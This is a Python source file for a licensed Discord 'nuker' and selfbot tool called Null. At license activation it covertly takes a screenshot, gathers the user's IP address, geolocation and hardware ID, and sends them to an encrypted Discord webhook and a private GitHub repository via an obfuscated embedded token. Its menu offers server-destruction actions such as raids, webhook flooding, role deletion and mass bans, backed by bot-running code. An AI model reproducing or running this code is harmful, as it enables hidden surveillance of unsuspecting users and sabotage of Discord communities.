import sys
import time
import os
import json
import hashlib
import uuid
import requests
import base64
import random
import string
import colorsys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import init, Fore, Style
import ctypes
import threading
import asyncio
import discord
from discord.ext import commands
import aiohttp

init(autoreset=True)

# Encryption settings
TOKEN_PASSPHRASE = "f0a5baf4-f90b-4800-a407-eb5065382113"
WEBHOOK_PASSPHRASE = "fdfac521-be53-4ed5-b7a0-47606a2f3821"

# Encrypted tokens
ENCRYPTED_GITHUB_TOKEN = "U2FsdGVkX1+EsNr+p0PWwWMW3udxhDXtt6WfIUaTVivHMUcE6wb4CPWd7spuy3moFuiadjsEQGPzojlv30mjc2sPklc8o4FLKqP/xehTeShOgn7LbTfVoiTIy5Sd7F1FKfjcBUSaOb0Zh6jk3JMYgw=="
ENCRYPTED_WEBHOOK = "U2FsdGVkX1+Nw4U/zl83/gKNEByPtf6hHZCyga+N6cKvQZNTQgo9fp4UjeajxHOySDCuZhv6PbgzS+VtCTMzE6ULKXqHChvUSVKiQRxjINzWrVIyWBMs2B3QwUZYflKrEJYj25kQ4wCcLaRIMJUmuoKpmpmKy+5oLz5Bi9FjYzOv8ftNm7Ye41t6Sy87Prwz"

# GitHub repository information
REPO_OWNER = "egirlhunt"
REPO_NAME = "nulllkeys"
FILE_PATH = "keys.json"

# GitHub API URL
GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

# Color themes with HSV-based gradients
COLOR_THEMES = {
    "1": {"name": "Red", "hue": 0.00},
    "2": {"name": "Orange", "hue": 0.08},
    "3": {"name": "Yellow", "hue": 0.15},
    "4": {"name": "Green", "hue": 0.33},
    "5": {"name": "Cyan", "hue": 0.50},
    "6": {"name": "Blue", "hue": 0.60},
    "7": {"name": "Purple", "hue": 0.75},
    "8": {"name": "Pink", "hue": 0.90},
    "9": {"name": "White", "grayscale": True},
    "10": {"name": "Rainbow", "rainbow": True}
}

# Set default theme to Purple (option 7)
current_theme = COLOR_THEMES["7"]

# License key storage file
LICENSE_FILE = "license.key"

# Selfbot storage files
SELFBOT_TOKENS_FILE = "selfbot_tokens.json"
SELFBOT_CONFIG_FILE = "config.json"

def get_console_width():
    """Get current console width"""
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80  # default width if terminal size can't be determined

def print_centered(text, width=None):
    """Print text centered in console"""
    if width is None:
        width = get_console_width()
    
    lines = text.split("\n")
    for line in lines:
        if line.strip():  # Only center non-empty lines
            print(line.center(width))
        else:
            print()  # Preserve empty lines

def print_color_centered(text, color_code="", width=None):
    """Print colored text centered in console"""
    if width is None:
        width = get_console_width()
    
    lines = text.split("\n")
    for line in lines:
        if line.strip():
            print(f"{color_code}{line.center(width)}{Style.RESET_ALL}")
        else:
            print()

def hsv_to_ansi(h, s=1.0, v=1.0):
    """Convert HSV to smooth ANSI 256 color"""
    r, g, b = colorsys.hsv_to_rgb(h, s, v)
    r = int(r * 5)
    g = int(g * 5)
    b = int(b * 5)
    return 16 + (36 * r) + (6 * g) + b

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown"

def get_geo_location(ip_address):
    """Get geolocation data for IP address"""
    if ip_address == "Unknown":
        return {
            "country": "Unknown", 
            "city": "Unknown", 
            "isp": "Unknown",
            "region": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "ip": "Unknown"
        }
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                geo_info = {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "lat": str(data.get("lat", "Unknown")),
                    "lon": str(data.get("lon", "Unknown")),
                    "ip": ip_address
                }
                return geo_info
    except:
        pass
    
    return {
        "country": "Unknown", 
        "city": "Unknown", 
        "isp": "Unknown",
        "region": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "ip": ip_address
    }

def evp_bytes_to_key(password, salt, key_len=32, iv_len=16):
    """OpenSSL EVP_BytesToKey compatible key derivation"""
    d = d_i = b''
    while len(d) < key_len + iv_len:
        d_i = hashlib.md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_len], d[key_len:key_len+iv_len]

def decrypt_aes_openssl(encrypted_text, passphrase):
    """Decrypt AES-256-CBC encrypted text (OpenSSL compatible)"""
    try:
        # Decode base64
        encrypted_data = base64.b64decode(encrypted_text)
        
        # Check for "Salted__" prefix
        if encrypted_data[:8] != b'Salted__':
            return ""
        
        # Extract salt (8 bytes after "Salted__")
        salt = encrypted_data[8:16]
        ciphertext = encrypted_data[16:]
        
        # Derive key and IV using OpenSSL's EVP_BytesToKey
        password = passphrase.encode('utf-8')
        key, iv = evp_bytes_to_key(password, salt, 32, 16)
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        
        # Remove PKCS7 padding
        plaintext = unpad(decrypted, AES.block_size)
        
        return plaintext.decode('utf-8')
        
    except Exception:
        return ""

def get_github_token():
    """Get decrypted GitHub token"""
    token = decrypt_aes_openssl(ENCRYPTED_GITHUB_TOKEN, TOKEN_PASSPHRASE)
    return token

def get_webhook_url():
    """Get decrypted webhook URL"""
    return decrypt_aes_openssl(ENCRYPTED_WEBHOOK, WEBHOOK_PASSPHRASE)

def get_hwid():
    """Generate a unique hardware ID"""
    try:
        hwid_parts = []
        
        # Get MAC address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0, 8*6, 8)][::-1])
        hwid_parts.append(mac)
        
        # Get machine ID if available
        if os.name == 'posix':
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_parts.append(f.read().strip())
            except:
                pass
        
        # Create hash from all parts
        hwid_string = '-'.join(hwid_parts)
        return hashlib.sha256(hwid_string.encode()).hexdigest()[:32]
        
    except Exception as e:
        return str(uuid.getnode())

def generate_random_id():
    """Generate a random 16-character ID"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(16))

def save_id_to_file(user_id, license_key):
    """Save ID to text file with warning"""
    warning_text = """WARNING: NEVER SHARE THIS ID

SHARING THIS COULD LEAD TO YOUR LICENSE KEY GETTING REMOVED OR STOLEN

ANYONE ELSE THAN @uekv ON DISCORD ASKING FOR THIS ID IS A SCAMMER/FAKER

YOUR ID: {user_id}
YOUR LICENSE KEY: {license_key}

This ID is your proof of ownership.
If you lose it, use the "Generate ID" option in the tool.
""".format(user_id=user_id, license_key=license_key)
    
    with open("ID.txt", "w") as f:
        f.write(warning_text)
    
    print_centered(f"{get_color('medium')}[+]{Style.RESET_ALL} {Fore.WHITE}ID saved to ID.txt{Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Keep this file safe! Never share it!{Style.RESET_ALL}")

def get_color(intensity="medium"):
    """Get color based on current theme and intensity"""
    if current_theme.get("rainbow"):
        hue = (time.time() * 0.08) % 1.0
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"

    if current_theme.get("grayscale"):
        shades = {"dark": 236, "medium": 245, "light": 255}
        return f"\033[38;5;{shades.get(intensity, 245)}m"

    hue = current_theme["hue"]
    value = {"dark": 0.55, "medium": 0.75, "light": 1.0}.get(intensity, 0.75)

    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def get_gradient_color(position, total_positions):
    """Get smooth gradient color for a specific position"""
    if total_positions <= 1:
        return "\033[38;5;255m"

    t = position / (total_positions - 1)

    if current_theme.get("rainbow"):
        # Real rainbow — smooth HSV sweep
        hue = t * 0.85  # avoid looping back to red
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"

    if current_theme.get("grayscale"):
        gray = int(232 + t * 23)
        return f"\033[38;5;{gray}m"

    # Smooth brightness gradient inside one color family
    hue = current_theme["hue"]
    value = 0.45 + (t * 0.55)  # dark → bright
    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def save_license_key(license_key):
    """Save license key to file"""
    try:
        with open(LICENSE_FILE, "w") as f:
            f.write(license_key)
        return True
    except:
        return False

def load_license_key():
    """Load license key from file"""
    try:
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, "r") as f:
                return f.read().strip()
    except:
        pass
    return ""

def ask_save_license_windows():
    """Ask user if they want to save the license key using Windows MessageBox"""
    try:
        result = ctypes.windll.user32.MessageBoxW(
            0,
            "Do you want to save your license key for next time?\n\nYes: Save and auto-load next time\nNo: Ask every time",
            "Save License Key",
            0x00000004 | 0x00000020  # Yes/No buttons + Question icon
        )
        
        # IDYES = 6, IDNO = 7
        return result == 6  # Returns True if Yes, False if No
    except:
        # Fallback to console if Windows MessageBox fails
        return False

def fetch_license_data():
    """Fetch and parse license data from private GitHub repository"""
    try:
        github_token = get_github_token()
        if not github_token:
            return []
        
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            file_info = response.json()
            content = base64.b64decode(file_info["content"]).decode('utf-8')
            licenses = json.loads(content)
            return licenses
            
    except Exception:
        pass
    
    return []

def update_license_data_with_ip(license_key, new_hwid, new_id="", geo_info=None):
    """Update license data in private GitHub repository with IP information"""
    try:
        github_token = get_github_token()
        if not github_token:
            return False
        
        # Get current file info
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        
        file_info = response.json()
        current_sha = file_info["sha"]
        current_content = base64.b64decode(file_info["content"]).decode('utf-8')
        
        # Parse and update the JSON
        licenses = json.loads(current_content)
        updated = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == license_key:
                # Update HWID
                license_entry["hwid"] = new_hwid
                
                # Update ID if provided
                if new_id and not license_entry.get("id"):
                    license_entry["id"] = new_id
                
                # Add IP and geolocation information
                if geo_info:
                    # Add IP info fields
                    license_entry["ip"] = geo_info.get("ip", "Unknown")
                    license_entry["country"] = geo_info.get("country", "Unknown")
                    license_entry["city"] = geo_info.get("city", "Unknown")
                    license_entry["isp"] = geo_info.get("isp", "Unknown")
                    license_entry["region"] = geo_info.get("region", "Unknown")
                    license_entry["latitude"] = geo_info.get("lat", "Unknown")
                    license_entry["longitude"] = geo_info.get("lon", "Unknown")
                    
                    # Add activation timestamp
                    license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                else:
                    # Just update last activity time
                    if "activation_time" not in license_entry:
                        license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                
                updated = True
                break
        
        if not updated:
            return False
        
        # Update file on GitHub
        update_data = {
            "message": f"Update license info for {license_key[:8]}...",
            "content": base64.b64encode(json.dumps(licenses, indent=2).encode()).decode(),
            "sha": current_sha
        }
        
        update_response = requests.put(GITHUB_API_URL, headers=headers, json=update_data, timeout=10)
        
        if update_response.status_code in [200, 201]:
            return True
        else:
            return False
            
    except Exception:
        return False

def take_screenshot():
    """Take a screenshot of the current screen using mss"""
    try:
        import mss
        import mss.tools
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            
            # Convert to bytes using mss.tools
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(img_bytes).decode('utf-8')
            
    except Exception:
        return None

def send_webhook(license_key, hwid, user_id="", geo_info=None):
    """Send registration to webhook with geolocation and screenshot (white embed)"""
    try:
        webhook_url = get_webhook_url()
        if not webhook_url:
            return False
        
        # Try to take screenshot
        screenshot_b64 = take_screenshot()
        
        # Create fields for embed - WHITE color (16777215)
        fields = [
            {"name": "License key", "value": f"`{license_key}`", "inline": True},
            {"name": "HWID", "value": f"`{hwid}`", "inline": True}
        ]
        
        if user_id:
            fields.append({"name": "User ID", "value": f"`{user_id}`", "inline": True})
        
        # Add geolocation info if available
        if geo_info:
            geo_fields = []
            if geo_info.get("ip") and geo_info["ip"] != "Unknown":
                geo_fields.append({"name": "IP Address", "value": f"`{geo_info['ip']}`", "inline": True})
            if geo_info.get("country") and geo_info["country"] != "Unknown":
                geo_fields.append({"name": "Country", "value": f"`{geo_info['country']}`", "inline": True})
            if geo_info.get("city") and geo_info["city"] != "Unknown":
                geo_fields.append({"name": "City", "value": f"`{geo_info['city']}`", "inline": True})
            if geo_info.get("isp") and geo_info["isp"] != "Unknown":
                geo_fields.append({"name": "ISP", "value": f"`{geo_info['isp']}`", "inline": False})
            if geo_info.get("region") and geo_info["region"] != "Unknown":
                geo_fields.append({"name": "Region", "value": f"`{geo_info['region']}`", "inline": True})
            if geo_info.get("lat") and geo_info["lat"] != "Unknown":
                geo_fields.append({"name": "Latitude", "value": f"`{geo_info['lat']}`", "inline": True})
            if geo_info.get("lon") and geo_info["lon"] != "Unknown":
                geo_fields.append({"name": "Longitude", "value": f"`{geo_info['lon']}`", "inline": True})
            
            fields.extend(geo_fields)
        
        # Add screenshot info
        if screenshot_b64:
            fields.append({"name": "Screenshot", "value": "Screenshot attached", "inline": False})
        else:
            fields.append({"name": "Screenshot", "value": "Could not capture screenshot", "inline": False})
        
        # Prepare payload with both content and embed - WHITE COLOR (16777215)
        payload = {
            "content": f"**License Key:** `{license_key}`",
            "embeds": [{
                "title": "NEW REGISTRATION",
                "color": 16777215,  # WHITE color
                "fields": fields,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
            }]
        }
        
        # If screenshot was captured, send it as a file
        if screenshot_b64:
            # Send screenshot as a separate message
            screenshot_file = {
                'file': ('screenshot.png', base64.b64decode(screenshot_b64), 'image/png')
            }
            
            # First send the embed with license key
            response1 = requests.post(webhook_url, json=payload, timeout=10)
            
            # Then send the screenshot
            response2 = requests.post(webhook_url, files=screenshot_file, timeout=10)
            
            return response1.status_code == 200 and response2.status_code == 200
        else:
            # Send just the embed
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code == 200
            
    except Exception:
        return False

def clear_console():
    """Clear console"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_ascii_art():
    """Display ASCII art centered"""
    clear_console()
    
    ascii_text = [
        " ███▄    █  █    ██  ██▓     ██▓    ",
        " ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ",
        "▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ",
        "▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░    ",
        "▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒",
        "░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░",
        "░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░",
        "   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ",
        "         ░    ░         ░  ░    ░  ░",
        "                                    "
    ]
    
    # Display with gradient
    for i, line in enumerate(ascii_text):
        color = get_gradient_color(i, len(ascii_text))
        print_color_centered(line, color)
    
    # Made by text centered
    made_by_text = "made by @uekv on discord"
    color = get_gradient_color(len(ascii_text) + 1, len(ascii_text) + 2)
    print_color_centered(made_by_text, color)
    
    # Separator centered
    separator = "─" * 50
    sep_color = get_gradient_color(len(ascii_text) + 2, len(ascii_text) + 3)
    print_color_centered(separator, sep_color)

def create_option_row(left_option, right_option=""):
    """Create a row with properly centered options"""
    width = get_console_width()
    
    if not right_option:
        # Center single option
        return left_option.center(width)
    
    # Calculate positions for two columns with more space
    # Leave 15 spaces between columns for better formatting
    total_len = len(left_option.strip()) + len(right_option.strip()) + 15
    
    if total_len > width:
        # If too long, stack them vertically
        return left_option.center(width) + "\n" + right_option.center(width)
    
    # Calculate padding
    padding = (width - total_len) // 2
    
    # Create row with proper padding
    return " " * padding + left_option + " " * 15 + right_option

def display_color_selection():
    display_ascii_art()
    
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color Selection Menu{Style.RESET_ALL}\n")
    
    width = get_console_width()
    
    color_keys = list(COLOR_THEMES.keys())
    
    for i in range(0, len(color_keys), 2):
        left_key = color_keys[i]
        left_theme = COLOR_THEMES[left_key]
        
        if left_theme.get("rainbow"):
            left_color = "\033[38;5;196m"
        elif left_theme.get("grayscale"):
            left_color = "\033[38;5;255m"
        else:
            left_hue = hsv_to_ansi(left_theme["hue"], 0.9, 0.75)
            left_color = f"\033[38;5;{left_hue}m"
        
        left_option = f"{left_color}[{left_key}]{Style.RESET_ALL}{Fore.WHITE} {left_theme['name']}"
        
        right_option = ""
        if i + 1 < len(color_keys):
            right_key = color_keys[i + 1]
            right_theme = COLOR_THEMES[right_key]
            
            if right_theme.get("rainbow"):
                right_color = "\033[38;5;196m"
            elif right_theme.get("grayscale"):
                right_color = "\033[38;5;255m"
            else:
                right_hue = hsv_to_ansi(right_theme["hue"], 0.9, 0.75)
                right_color = f"\033[38;5;{right_hue}m"
            
            right_option = f"{right_color}[{right_key}]{Style.RESET_ALL}{Fore.WHITE} {right_theme['name']}"
        
        print(create_option_row(left_option, right_option))
    
    print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > ", end="")
    return input().strip()

def display_main_menu():
    display_ascii_art()
    
    # Main menu options - all white text
    menu_text = f"""
{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Change Color
{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Generate ID
{get_color('light')}[3]{Style.RESET_ALL}{Fore.WHITE} Nuking (BOT tokens ONLY)
{get_color('light')}[4]{Style.RESET_ALL}{Fore.WHITE} Selfbot (USER tokens ONLY)
{get_color('light')}[5]{Style.RESET_ALL}{Fore.WHITE} Exit
"""
    
    print_centered(menu_text)
    print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > ", end="")
    return input().strip()

def display_license_prompt():
    display_ascii_art()
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Enter License Key > ", end="")
    return input().strip()

def validate_license_key(save_license_prompt=False):
    saved_key = load_license_key()
    user_key = ""
    
    if saved_key and not save_license_prompt:
        user_key = saved_key
        display_ascii_art()
        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Using saved license key...{Style.RESET_ALL}")
        time.sleep(1)
    else:
        user_key = display_license_prompt()
    
    if not user_key:
        display_ascii_art()
        print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}No license key entered!{Style.RESET_ALL}")
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Exiting...{Style.RESET_ALL}")
        sys.exit(1)
    
    display_ascii_art()
    print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Checking private database...{Style.RESET_ALL}")
    time.sleep(1)
    
    try:
        licenses = fetch_license_data()
        
        if not licenses:
            display_ascii_art()
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Private database connection failed{Style.RESET_ALL}")
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Exiting...{Style.RESET_ALL}")
            sys.exit(1)
        
        license_found = False
        current_hwid = get_hwid()
        user_id = ""
        is_first_activation = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == user_key:
                license_found = True
                stored_hwid = license_entry.get("hwid", "").strip()
                user_id = license_entry.get("id", "").strip()
                
                if not stored_hwid:
                    is_first_activation = True
                    display_ascii_art()
                    print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}New activation detected{Style.RESET_ALL}")
                    
                    ip_address = get_public_ip()
                    geo_info = get_geo_location(ip_address)
                    
                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Gathering system information...{Style.RESET_ALL}")
                    
                    if not user_id:
                        user_id = generate_random_id()
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Creating User ID...{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Generated User ID: {user_id}{Style.RESET_ALL}")
                        save_id_to_file(user_id, user_key)
                    
                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Sending registration info...{Style.RESET_ALL}")
                    webhook_thread = threading.Thread(target=send_webhook, args=(user_key, current_hwid, user_id, geo_info))
                    webhook_thread.start()
                    
                    if update_license_data_with_ip(user_key, current_hwid, user_id, geo_info):
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating database...{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated!{Style.RESET_ALL}")
                        
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Please check Windows popup...{Style.RESET_ALL}")
                        if ask_save_license_windows():
                            if save_license_key(user_key):
                                print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}License key saved for next time{Style.RESET_ALL}")
                        
                        time.sleep(2)
                        return True, user_key
                    else:
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database update failed{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Exiting...{Style.RESET_ALL}")
                        sys.exit(1)
                else:
                    if stored_hwid == current_hwid:
                        display_ascii_art()
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Hardware verified{Style.RESET_ALL}")
                        
                        update_license_data_with_ip(user_key, current_hwid, user_id, None)
                        
                        if user_id and not os.path.exists("ID.txt"):
                            save_id_to_file(user_id, user_key)
                        time.sleep(1)
                        return True, user_key
                    else:
                        display_ascii_art()
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                        
                        for i in range(10, 0, -1):
                            display_ascii_art()
                            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                            time.sleep(1)
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Exiting...{Style.RESET_ALL}")
                        sys.exit(1)
        
        if not license_found:
            display_ascii_art()
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Closing in 3 seconds...{Style.RESET_ALL}")
            
            for i in range(3, 0, -1):
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
                print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                time.sleep(1)
            
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Exiting...{Style.RESET_ALL}")
            sys.exit(1)
            
    except Exception as e:
        display_ascii_art()
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database error{Style.RESET_ALL}")
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Exiting...{Style.RESET_ALL}")
        sys.exit(1)
    
    return False, ""

# ────────────────────────────────────────────────────────────────────────────────
#   NUKING CATEGORY - USES BOT TOKENS ONLY (STRICTLY BOT TOKENS)
# ────────────────────────────────────────────────────────────────────────────────

def display_nuking_menu():
    display_ascii_art()
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Nuking Menu (BOT TOKENS ONLY){Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}This category requires BOT tokens ONLY from Discord Developer Portal{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}USER TOKENS WILL BE REJECTED HERE{Style.RESET_ALL}")
    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}\n")

    # Format options in pairs - ALL WHITE TEXT, PROPERLY CENTERED with more space
    rows = [
        (f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Fast nuke", 
         f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Nuke"),
        (f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.WHITE} Raid", 
         f"{get_color('light')}[4]{Style.RESET_ALL}{Fore.WHITE} Webhook spam"),
        (f"{get_color('light')}[5]{Style.RESET_ALL}{Fore.WHITE} Webhook flood", 
         f"{get_color('light')}[6]{Style.RESET_ALL}{Fore.WHITE} Role delete"),
        (f"{get_color('light')}[7]{Style.RESET_ALL}{Fore.WHITE} Role spam", 
         f"{get_color('light')}[8]{Style.RESET_ALL}{Fore.WHITE} Ban all"),
        (f"{get_color('light')}[9]{Style.RESET_ALL}{Fore.WHITE} Kick all", 
         f"{get_color('light')}[0]{Style.RESET_ALL}{Fore.WHITE} ← Back")
    ]

    for left, right in rows:
        print(create_option_row(left, right))

    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")

    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select > ", end="")
    return input().strip()

async def validate_bot_token(token):
    """Validate a BOT token (not user token)"""
    # Clean token
    clean_token = token.strip().replace('"', '').replace("'", "")
    
    # Check if it starts with Bot/bot prefix
    if not (clean_token.startswith('Bot ') or clean_token.startswith('bot ')):
        # Try to add Bot prefix
        if not clean_token.startswith('Bot ') and not clean_token.startswith('bot '):
            clean_token = f"Bot {clean_token}"
    
    headers = {
        "Authorization": clean_token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            # Try to fetch bot info from Discord API
            async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
                if resp.status == 200:
                    user_data = await resp.json()
                    # Check if it's a bot account
                    if user_data.get('bot', False):
                        username = f"{user_data['username']}#{user_data.get('discriminator', '0')}"
                        return True, username, "bot"
                    else:
                        return False, None, "user_token_not_bot"
                elif resp.status == 401:
                    return False, None, "invalid_token"
                else:
                    return False, None, f"api_error_{resp.status}"
    except asyncio.TimeoutError:
        return False, None, "timeout"
    except Exception as e:
        return False, None, f"connection_error: {str(e)}"

async def run_nuker(token: str, coro):
    """Run nuker with BOT token ONLY"""
    # Validate it's a bot token first
    print(f"{Fore.YELLOW}[INFO] Validating BOT token...{Style.RESET_ALL}")
    valid, username, token_type = await validate_bot_token(token)
    
    if not valid:
        if token_type == "user_token_not_bot":
            print(f"{Fore.RED}[ERROR] USER token detected! This category requires BOT tokens ONLY.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] Get BOT tokens from Discord Developer Portal{Style.RESET_ALL}")
            return
        else:
            print(f"{Fore.RED}[ERROR] Invalid token! ({token_type}){Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Valid BOT token: {username}{Style.RESET_ALL}")
    
    intents = discord.Intents.default()
    intents.members = True
    intents.messages = True
    intents.guilds = True
    intents.webhooks = True
    
    bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        print(f"{Fore.GREEN}[ONLINE] Logged in as {bot.user} (BOT - ID: {bot.user.id}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[INFO] Connected to {len(bot.guilds)} guilds{Style.RESET_ALL}")
        
        for guild in bot.guilds:
            print(f"{Fore.CYAN}[INFO] Guild: {guild.name} (ID: {guild.id}){Style.RESET_ALL}")

        # Set presence
        await bot.change_presence(
            status=discord.Status.idle,
            activity=discord.Streaming(
                name="Null.xd",
                url="https://www.twitch.tv/nullxd"
            )
        )

        try:
            await coro(bot)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Action crashed → {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
        finally:
            await bot.close()

    try:
        await bot.start(token, bot=True)
    except discord.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid BOT token! Get tokens from Discord Developer Portal{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[INFO] Make sure you're using a BOT token, not a user token{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Login/startup failed → {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

async def safe_edit(obj, **kwargs):
    try:
        await obj.edit(**kwargs)
        return True
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to edit {obj}: {e}{Style.RESET_ALL}")
